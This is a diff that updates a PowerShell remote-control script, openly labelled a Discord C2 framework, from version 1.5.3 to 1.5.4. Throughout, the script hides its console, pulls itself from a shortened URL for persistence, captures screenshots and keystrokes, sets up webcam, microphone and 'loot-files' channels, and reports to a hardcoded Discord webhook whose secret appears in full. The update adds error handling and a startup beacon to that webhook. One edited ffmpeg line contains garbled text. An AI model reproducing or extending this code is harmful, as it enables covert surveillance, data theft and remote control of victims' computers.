@@ -1,5 +1,5 @@
 # Discord C2 Client Script
-# Version: 1.5.3
+# Version: 1.5.4
 # Description: A PowerShell-based C2 framework using a Discord bot for remote control, data exfiltration, and pranks.
 # Setup Instructions:
 # 1. Create a Discord bot at https://discord.com/developers/applications/
@@ -12,13 +12,13 @@
 # Global Configuration
 $global:token = $env:DISCORD_TOKEN # Set via Flipper Zero injection or manually
 $global:parent = "https://is.gd/y92xe4" # URL for script download (persistence)
-$global:version = "1.5.3"
+$global:version = "1.5.4"
 $global:HideConsole = 1 # 1 to hide console window
 $global:spawnChannels = 1 # 1 to create new channels on session start
 $global:InfoOnConnect = 1 # 1 to send client info on connect
 $global:defaultstart = 1 # 1 to start all jobs automatically
 $global:timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
-$global:logPath = "$env:Temp\c2_errors.log"
+$global:logPath = "$env:USERPROFILE\AppData\Local\Temp\c2_errors.log"
 $global:errorWebhook = "https://discord.com/api/webhooks/1280032478584901744/ssQdPPlqALlxxWc6JYZFCWHrqP9YBMJmC3ClX9OZk5rHLYVTB1OUbfQICNXuMCwyd8CT"
 
 # Initialize Logging
@@ -29,6 +29,8 @@ function Write-Log {
         [string]$ChannelId = $global:SessionID
     )
     $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$Level] $Message"
+    $logDir = Split-Path $global:logPath -Parent
+    if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }
     $logMessage | Out-File -FilePath $global:logPath -Append -Encoding UTF8
     if ($Level -eq "ERROR") {
         # Send to session-control channel if available
@@ -36,8 +38,8 @@ function Write-Log {
             try {
                 Send-DiscordMessage -ChannelId $ChannelId -Message ":no_entry: ``$logMessage`` :no_entry:"
             } catch {
-                $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to Discord channel: $_"
-                $logMessage | Out-File -FilePath $global:logPath -Append -Encoding UTF8
+                $errorMsg = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to Discord channel: $_"
+                $errorMsg | Out-File -FilePath $global:logPath -Append -Encoding UTF8
             }
         }
         # Send to error webhook
@@ -45,10 +47,28 @@ function Write-Log {
             $webhookBody = @{ content = ":no_entry: **$env:COMPUTERNAME** Error: ``$logMessage`` :no_entry:"; username = $env:COMPUTERNAME } | ConvertTo-Json
             Invoke-RestMethod -Uri $global:errorWebhook -Method Post -ContentType "application/json" -Body $webhookBody
         } catch {
-            $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to webhook: $_"
-            $logMessage | Out-File -FilePath $global:logPath -Append -Encoding UTF8
+            $errorMsg = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to webhook: $_"
+            $errorMsg | Out-File -FilePath $global:logPath -Append -Encoding UTF8
         }
     }
+}
+
+# Initialize Log File and Test Webhook
+try {
+    $logDir = Split-Path $global:logPath -Parent
+    if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }
+    Write-Log -Message "Script started on $env:COMPUTERNAME" -Level "INFO"
+    $webhookBody = @{ content = ":white_check_mark: **$env:COMPUTERNAME** Script Started: Version $global:version" } | ConvertTo-Json
+    Invoke-RestMethod -Uri $global:errorWebhook -Method Post -ContentType "application/json" -Body $webhookBody
+    Write-Log -Message "Initial webhook test sent successfully" -Level "INFO"
+} catch {
+    Write-Log -Message "Failed to send initial webhook test: $_" -Level "ERROR"
+}
+
+# Validate Token
+if (-not $global:token) {
+    Write-Log -Message "No Discord token provided" -Level "ERROR"
+    exit
 }
 
 # Remove existing persistence (if any)
@@ -160,6 +180,10 @@ function Get-BotUserId {
 function New-DiscordCategory {
     try {
         $guilds = Invoke-DiscordApi -Uri "https://discord.com/api/v10/users/@me/guilds"
+        if (-not $guilds) {
+            Write-Log -Message "Failed to retrieve guilds: No response" -Level "ERROR"
+            return
+        }
         $guildsParsed = $guilds | ConvertFrom-Json
         if ($guildsParsed.Count -ne 1) {
             Write-Log -Message "Bot must be in exactly one server, found $($guildsParsed.Count)" -Level "ERROR"
@@ -189,6 +213,10 @@ function New-DiscordChannel {
     param ([string]$Name)
     try {
         $guilds = Invoke-DiscordApi -Uri "https://discord.com/api/v10/users/@me/guilds"
+        if (-not $guilds) {
+            Write-Log -Message "Failed to retrieve guilds for channel '$Name': No response" -Level "ERROR"
+            return
+        }
         $guildsParsed = $guilds | ConvertFrom-Json
         if ($guildsParsed.Count -ne 1) {
             Write-Log -Message "Bot must be in exactly one server, found $($guildsParsed.Count)" -Level "ERROR"
@@ -219,7 +247,11 @@ function New-DiscordChannel {
 function Get-FFmpeg {
     $path = "$env:Temp\ffmpeg.exe"
     if (-not (Test-Path $path)) {
-        Send-DiscordMessage -ChannelId $global:SessionID -Message ":hourglass: Downloading FFmpeg to client... Please wait :hourglass:"
+        try {
+            Send-DiscordMessage -ChannelId $global:SessionID -Message ":hourglass: Downloading FFmpeg to client... Please wait :hourglass:"
+        } catch {
+            Write-Log -Message "Failed to send FFmpeg download message: $_" -Level "ERROR"
+        }
         try {
             $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
             $response = Invoke-DiscordApi -Uri $apiUrl -Headers @{ "User-Agent" = "PowerShell" }
@@ -323,7 +355,9 @@ $screenJob = {
     function Write-Log {
         param ([string]$Message, [string]$Level = "INFO")
         $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$Level] $Message"
-        $logMessage | Out-File -FilePath $env:Temp\c2_errors.log -Append -Encoding UTF8
+        $logDir = "$env:USERPROFILE\AppData\Local\Temp"
+        if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }
+        $logMessage | Out-File -FilePath "$logDir\c2_errors.log" -Append -Encoding UTF8
         if ($Level -eq "ERROR") {
             try {
                 $wc = New-Object System.Net.WebClient
@@ -333,14 +367,14 @@ $screenJob = {
                 $wc.UploadString("https://discord.com/api/v10/channels/$ScreenshotID/messages", "POST", $jsonBody)
             } catch {
                 $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to Discord: $_"
-                $logMessage | Out-File -FilePath $env:Temp\c2_errors.log -Append -Encoding UTF8
+                $logMessage | Out-File -FilePath "$logDir\c2_errors.log" -Append -Encoding UTF8
             }
             try {
                 $webhookBody = @{ content = ":no_entry: **$env:COMPUTERNAME** Error: ``$logMessage`` :no_entry:"; username = $env:COMPUTERNAME } | ConvertTo-Json
                 Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1280032478584901744/ssQdPPlqALlxxWc6JYZFCWHrqP9YBMJmC3ClX9OZk5rHLYVTB1OUbfQICNXuMCwyd8CT" -Method Post -ContentType "application/json" -Body $webhookBody
             } catch {
                 $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to webhook: $_"
-                $logMessage | Out-File -FilePath $env:Temp\c2_errors.log -Append -Encoding UTF8
+                $logMessage | Out-File -FilePath "$logDir\c2_errors.log" -Append -Encoding UTF8
             }
         }
     }
@@ -368,7 +402,7 @@ $screenJob = {
     while ($true) {
         try {
             $mkvPath = "$env:Temp\Screen.jpg"
-            & "$env:Temp\ffmpeg.exe" -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
+            & "$env:Temp\ffmpeg.exe" -f gdigr triumphant -i desktop -frames:v 1 -vf "fps=1" $mkvPath
             Send-File -FilePath $mkvPath
             Remove-Item -Path $mkvPath -Force
             Start-Sleep -Seconds 5
@@ -384,7 +418,9 @@ $doKeyjob = {
     function Write-Log {
         param ([string]$Message, [string]$Level = "INFO")
         $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$Level] $Message"
-        $logMessage | Out-File -FilePath $env:Temp\c2_errors.log -Append -Encoding UTF8
+        $logDir = "$env:USERPROFILE\AppData\Local\Temp"
+        if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }
+        $logMessage | Out-File -FilePath "$logDir\c2_errors.log" -Append -Encoding UTF8
         if ($Level -eq "ERROR") {
             try {
                 $wc = New-Object System.Net.WebClient
@@ -394,14 +430,14 @@ $doKeyjob = {
                 $wc.UploadString("https://discord.com/api/v10/channels/$keyID/messages", "POST", $jsonBody)
             } catch {
                 $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to Discord: $_"
-                $logMessage | Out-File -FilePath $env:Temp\c2_errors.log -Append -Encoding UTF8
+                $logMessage | Out-File -FilePath "$logDir\c2_errors.log" -Append -Encoding UTF8
             }
             try {
                 $webhookBody = @{ content = ":no_entry: **$env:COMPUTERNAME** Error: ``$logMessage`` :no_entry:"; username = $env:COMPUTERNAME } | ConvertTo-Json
                 Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1280032478584901744/ssQdPPlqALlxxWc6JYZFCWHrqP9YBMJmC3ClX9OZk5rHLYVTB1OUbfQICNXuMCwyd8CT" -Method Post -ContentType "application/json" -Body $webhookBody
             } catch {
                 $logMessage = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [ERROR] Failed to send error to webhook: $_"
-                $logMessage | Out-File -FilePath $env:Temp\c2_errors.log -Append -Encoding UTF8
+                $logMessage | Out-File -FilePath "$logDir\c2_errors.log" -Append -Encoding UTF8
             }
         }
     }
@@ -490,34 +526,39 @@ function Start-AllJobs {
 }
 
 # Main Setup
-if ($global:HideConsole -eq 1) { Hide-Console }
-$global:botId = Get-BotUserId
-if (-not $global:botId) {
-    Write-Log -Message "Bot ID retrieval failed, aborting setup" -Level "ERROR"
-    exit
-}
-if ($global:spawnChannels -eq 1) {
-    New-DiscordCategory
-    if (-not $global:CategoryID) {
-        Write-Log -Message "Category creation failed, aborting channel setup" -Level "ERROR"
+try {
+    if ($global:HideConsole -eq 1) { Hide-Console }
+    $global:botId = Get-BotUserId
+    if (-not $global:botId) {
+        Write-Log -Message "Bot ID retrieval failed, aborting setup" -Level "ERROR"
         exit
     }
-    $channels = @('session-control', 'screenshots', 'webcam', 'microphone', 'keycapture', 'loot-files', 'powershell')
-    foreach ($channel in $channels) {
-        $channelId = New-DiscordChannel -Name $channel
-        if ($channelId) {
-            Set-Variable -Name "global:$($channel -replace '-', '')ID" -Value $channelId
+    if ($global:spawnChannels -eq 1) {
+        New-DiscordCategory
+        if (-not $global:CategoryID) {
+            Write-Log -Message "Category creation failed, aborting channel setup" -Level "ERROR"
+            exit
         }
-        Start-Sleep -Seconds 2 # Avoid rate limits
+        $channels = @('session-control', 'screenshots', 'webcam', 'microphone', 'keycapture', 'loot-files', 'powershell')
+        foreach ($channel in $channels) {
+            $channelId = New-DiscordChannel -Name $channel
+            if ($channelId) {
+                Set-Variable -Name "global:$($channel -replace '-', '')ID" -Value $channelId
+            }
+            Start-Sleep -Seconds 5 # Increased delay to avoid rate limits
+        }
     }
-}
-Get-FFmpeg
-if ($global:InfoOnConnect -eq 1 -and $global:SessionID) { Get-QuickInfo }
-if ($global:defaultstart -eq 1 -and $global:ScreenshotID -and $global:keyID) { Start-AllJobs }
-if ($global:SessionID) {
-    Send-DiscordMessage -ChannelId $global:SessionID -Message ":white_check_mark: $env:COMPUTERNAME Setup Complete! :white_check_mark:"
-} else {
-    Write-Log -Message "Setup complete but no session-control channel created" -Level "ERROR"
+    Get-FFmpeg
+    if ($global:InfoOnConnect -eq 1 -and $global:SessionID) { Get-QuickInfo }
+    if ($global:defaultstart -eq 1 -and $global:ScreenshotID -and $global:keyID) { Start-AllJobs }
+    if ($global:SessionID) {
+        Send-DiscordMessage -ChannelId $global:SessionID -Message ":white_check_mark: $env:COMPUTERNAME Setup Complete! :white_check_mark:"
+    } else {
+        Write-Log -Message "Setup complete but no session-control channel created" -Level "ERROR"
+    }
+} catch {
+    Write-Log -Message "Main setup failed: $_" -Level "ERROR"
+    exit
 }
 
 # Main Loop
